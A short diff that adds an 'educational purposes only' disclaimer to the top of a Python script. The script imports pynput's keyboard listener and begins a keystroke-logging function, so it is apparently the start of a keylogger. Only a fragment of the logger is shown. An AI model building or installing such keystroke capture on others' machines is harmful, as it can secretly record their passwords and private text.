@@ -1,3 +1,7 @@
+'''
+DISCLAIMER
+This script is intended for educational purposes only.
+'''
 from pynput.keyboard import Listener
 def log_keystroke(key):
     key = str(key).replace("'","")
